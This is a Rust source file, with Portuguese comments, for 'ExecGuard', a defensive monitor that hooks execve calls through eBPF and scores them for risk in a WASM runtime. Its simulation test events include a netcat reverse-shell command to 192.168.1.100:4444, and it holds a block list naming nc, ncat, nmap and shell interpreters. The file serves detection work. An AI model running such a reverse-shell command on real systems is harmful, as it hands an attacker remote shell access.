use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;
use std::time::Instant;

mod wasm_runtime;
use wasm_runtime::{WasmRuntime, HostState, ExecEvent, Alert};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Verifica se está rodando como root (necessário para eBPF)
    if unsafe { libc::getuid() } != 0 {
        eprintln!("⚠️  AVISO: eBPF requer root. Executando em modo SIMULAÇÃO.");
        return run_simulation().await;
    }
    
    run_ebpf_real().await
}

// ========== MODO REAL: eBPF + WASM ==========

async fn run_ebpf_real() -> anyhow::Result<()> {
    use aya::{include_bytes_aligned, maps::RingBuf, util::online_cpus, Ebpf};
    use aya_log::EbpfLogger;
    
    println!("{}", "=".repeat(80));
    println!("EXECGUARD - eBPF + WASM Security Pipeline [MODO REAL]");
    println!("{}", "=".repeat(80));
    
    // Carrega eBPF program compilado
    #[cfg(debug_assertions)]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../execguard-ebpf/target/bpfel-unknown-none/debug/execguard"
    ))?;
    
    #[cfg(not(debug_assertions))]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../execguard-ebpf/target/bpfel-unknown-none/release/execguard"
    ))?;
    
    // Anexa ao tracepoint sys_enter_execve
    let program: &mut aya::programs::TracePoint = bpf
        .program_mut("execguard")
        .unwrap()
        .try_into()?;
    program.load()?;
    program.attach("syscalls", "sys_enter_execve")?;
    
    // Inicializa logger do eBPF
    EbpfLogger::init(&mut bpf)?;
    
    // Configura ring buffer
    let mut exec_events = RingBuf::try_from(bpf.map_mut("EXEC_EVENTS")?)?;
    
    // Canal para alerts
    let (alerts_tx, mut alerts_rx) = mpsc::channel::<Alert>(1000);
    
    // Inicializa WASM runtime
    let wasm_bytes = std::fs::read("execguard.wasm")?;
    let host_state = HostState {
        banned_binaries: vec![
            "nc".into(), "ncat".into(), "nmap".into(),
            "python".into(), "python3".into(),
            "bash".into(), "sh".into(),
        ],
        process_history: Arc::new(Mutex::new(Vec::new())),
        alerts_tx: alerts_tx.clone(),
    };
    
    let mut runtime = WasmRuntime::new(&wasm_bytes, host_state)?;
    
    // Task: printa alerts periodicamente
    let alerts_handle = tokio::spawn(async move {
        let mut buffer = Vec::new();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(100));
        
        loop {
            interval.tick().await;
            
            // Consome todos alerts disponíveis
            while let Ok(alert) = alerts_rx.try_recv() {
                buffer.push(alert);
            }
            
            if !buffer.is_empty() {
                println!();
                for alert in &buffer {
                    println!(
                        "\x1b[31m🚨 ALERT [Sev {}] {}: {}\x1b[0m",
                        alert.severity, alert.category, alert.description
                    );
                }
                buffer.clear();
            }
        }
    });
    
    // Loop principal: consome ringbuf e processa com WASM
    println!("🎯 Monitorando execve()... Pressione Ctrl+C para parar.\n");
    
    let mut count = 0u64;
    let mut last_print = Instant::now();
    
    loop {
        // Poll ringbuf com timeout
        match exec_events.next() {
            Some(item) => {
                let event: aya_ebpf::ExecEvent = unsafe { 
                    std::ptr::read(item.as_ptr() as *const _) 
                };
                
                // Converte para nosso formato
                let exec_event = ExecEvent {
                    pid: event.pid,
                    uid: event.uid,
                    gid: event.gid,
                    timestamp_ns: event.timestamp_ns,
                    comm: event.comm.to_vec(),
                    filename: event.filename.to_vec(),
                    argc: event.argc,
                    risk_score: 0.0,
                };
                
                let start = Instant::now();
                let enriched = runtime.process_event(&exec_event)?;
                let elapsed = start.elapsed();
                
                count += 1;
                
                // Printa a cada 1 segundo ou se risk > 5
                if enriched.risk_score > 5.0 || last_print.elapsed().as_secs() >= 1 {
                    let risk_color = if enriched.risk_score >= 7.0 {
                        "\x1b[31m"
                    } else if enriched.risk_score >= 4.0 {
                        "\x1b[33m"
                    } else {
                        "\x1b[32m"
                    };
                    
                    println!(
                        "[{:>6}µs] PID={:<6} UID={:<6} RISK={}{:>4.1}\x1b[0m  COMM={:<12} FILE={}",
                        elapsed.as_micros(),
                        enriched.pid,
                        enriched.uid,
                        risk_color,
                        enriched.risk_score,
                        vec_to_string(&enriched.comm),
                        vec_to_string(&enriched.filename)
                    );
                    
                    last_print = Instant::now();
                }
            }
            None => {
                // Sem eventos, dorme um pouco
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            }
        }
    }
}

// ========== MODO SIMULAÇÃO (sem root) ==========

async fn run_simulation() -> anyhow::Result<()> {
    let wasm_bytes = std::fs::read("execguard.wasm")?;
    let (alerts_tx, mut alerts_rx) = mpsc::channel::<Alert>(100);
    
    let host_state = HostState {
        banned_binaries: vec![
            "nc".into(), "ncat".into(), "nmap".into(),
            "python".into(), "python3".into(),
        ],
        process_history: Arc::new(Mutex::new(Vec::new())),
        alerts_tx,
    };
    
    let mut runtime = WasmRuntime::new(&wasm_bytes, host_state)?;
    
    let test_events = vec![
        ExecEvent {
            pid: 1234, uid: 1000, gid: 1000,
            timestamp_ns: 0,
            comm: string_to_vec("bash", 16),
            filename: string_to_vec("/tmp/nc -e /bin/bash 192.168.1.100 4444", 256),
            argc: 5, risk_score: 0.0,
        },
        ExecEvent {
            pid: 1235, uid: 0, gid: 0,
            timestamp_ns: 0,
            comm: string_to_vec("sudo", 16),
            filename: string_to_vec("/usr/bin/sudo", 256),
            argc: 1, risk_score: 0.0,
        },
        ExecEvent {
            pid: 1236, uid: 1001, gid: 1001,
            timestamp_ns: 0,
            comm: string_to_vec("python3", 16),
            filename: string_to_vec("/tmp/exploit.py", 256),
            argc: 2, risk_score: 0.0,
        },
    ];
    
    println!("{}", "=".repeat(80));
    println!("EXECGUARD - eBPF + WASM Security Pipeline [MODO SIMULAÇÃO]");
    println!("{}", "=".repeat(80));
    
    let mut results = Vec::new();
    for event in test_events {
        let start = Instant::now();
        let enriched = runtime.process_event(&event)?;
        let elapsed = start.elapsed();
        results.push((enriched, elapsed));
    }
    
    let mut alerts = Vec::new();
    while let Ok(alert) = alerts_rx.try_recv() {
        alerts.push(alert);
    }
    
    if !alerts.is_empty() {
        println!();
        for alert in alerts {
            println!(
                "\x1b[31m🚨 ALERT [Sev {}] {}: {}\x1b[0m",
                alert.severity, alert.category, alert.description
            );
        }
    }
    
    println!();
    for (enriched, elapsed) in results {
        let risk_color = if enriched.risk_score >= 7.0 {
            "\x1b[31m"
        } else if enriched.risk_score >= 4.0 {
            "\x1b[33m"
        } else {
            "\x1b[32m"
        };
        
        println!(
            "[{:>6}µs] PID={:<6} UID={:<6} RISK={}{:>4.1}\x1b[0m  FILE={}",
            elapsed.as_micros(),
            enriched.pid,
            enriched.uid,
            risk_color,
            enriched.risk_score,
            vec_to_string(&enriched.filename)
        );
    }
    
    println!();
    println!("{}", "=".repeat(80));
    Ok(())
}

// ========== HELPERS ==========

fn string_to_vec(s: &str, max_len: usize) -> Vec<u8> {
    let mut v = vec![0u8; max_len];
    let bytes = s.as_bytes();
    let len = bytes.len().min(max_len - 1);
    v[..len].copy_from_slice(&bytes[..len]);
    v
}

fn vec_to_string(v: &[u8]) -> String {
    let len = v.iter().position(|&b| b == 0).unwrap_or(v.len());
    String::from_utf8_lossy(&v[..len]).into_owned()
}
